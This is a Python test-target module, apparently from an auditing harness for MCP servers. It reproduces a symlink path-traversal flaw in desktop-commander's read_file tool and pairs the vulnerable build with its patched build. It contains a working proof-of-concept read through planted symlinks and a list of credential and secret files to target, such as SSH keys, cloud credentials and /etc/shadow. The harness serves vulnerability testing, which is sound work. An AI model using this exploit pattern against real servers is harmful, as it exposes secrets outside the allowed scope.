"""CVE-2025-11489: @wonderwhy-er/desktop-commander symlink scope bypass (CWE-22).

validatePath (src/tools/filesystem.ts) runs isPathAllowed on the unresolved path and only
afterwards calls fs.realpath, so an in-scope symlink whose target is outside the allowed directory
passes the scope check and read_file returns the out-of-scope target's bytes. The first patch 0.2.33
(a1177ec / PR #321) resolves the symlink with fs.realpath before the check and rejects it.

The filesystem builder mounts the workspace read-only and, for every planted file, creates an
in-scope symlink /srv/app/leak<i>/report pointing at the planted coordinate. The exploit reads that
symlink; the flaw follows it out of scope. Only file-kind places get a planted file and thus a leak
symlink, so the sweep keeps exactly the file-kind arbitrary_read places.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import filesystem_env
from evals.cve_grammar import MechanismClass
from evals.cve_layout import PROJECT  # "/srv/app", the in-scope checkout
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# The exploit output must carry a nonce read through a leak symlink; the aim matches the leak path
# the exploit sends (never the benign in-scope read of /srv/app/.git/HEAD).
AIM = re.compile(r"/leak\d+/report")

# Every file-kind place reachable_by arbitrary_read: the only places the symlink read surfaces (a
# file is planted at the coordinate and the builder links an in-scope path to it). Non-file
# arbitrary_read places (hostname, env, unplaceable) carry no planted file and so no leak symlink.
#
# Layout settlement (the three source=layout places the kit left to the route check: the
# settlement place workspace-dotenv and its two siblings bare-remote-url, bare-history-env). The
# route check admits all three (the server's listing names /srv and the out-of-scope /srv/app.git),
# but the symlink read surfaces a planted FILE through its leak symlink, and a layout node is
# materialised directly in the tree with no leak symlink, so the exploit surfaces none of their
# nonces (calibration reads each as a dead condition). No layout place is kept.
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
)


def _coordinate_paths(places: Places, place_id: str) -> tuple[str, ...]:
    coordinates = places[place_id].coordinates
    if coordinates.paths is not None:
        return coordinates.paths
    return (coordinates.path,) if coordinates.path is not None else ()


def _leak_indices(places: Places, place_id: str) -> list[int]:
    # Mirror the builder's flat enumeration of planted files (places in KEPT order, each coordinate
    # path in order) so an exploit reads the exact /srv/app/leak<i>/report created for its place.
    index = 0
    for current in KEPT_PLACES:
        paths = _coordinate_paths(places, current)
        if current == place_id:
            return list(range(index, index + len(paths)))
        index += len(paths)
    return []


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        for index in _leak_indices(places, place_id):
            await client.call_tool("read_file", {"path": f"{PROJECT}/leak{index}/report"})

    run.__name__ = f"read_{place_id.replace('-', '_')}"
    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # An in-scope, non-symlink read: succeeds on both versions, carries no nonce, not aimed.
    await client.call_tool("read_file", {"path": f"{PROJECT}/.git/HEAD"})


TARGET = CVETarget(
    cve_id="CVE-2025-11489",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
    aim=AIM,
    reaches=frozenset({"arbitrary_read"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2025-11489-desktop-commander",),
    server_image="holdout-2025-11489-desktop-commander",
    patched_image="holdout-2025-11489-desktop-commander-patched",
    planting_host=PlantingHost(SymbolicUser.HOST, PROJECT, has_network=False),
    builder=filesystem_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Symlink scope bypass (CWE-22): validatePath checks isPathAllowed on the unresolved path "
        "before fs.realpath, so read_file follows an in-scope symlink to an out-of-scope target."
    ),
    tools_filter=None,
)
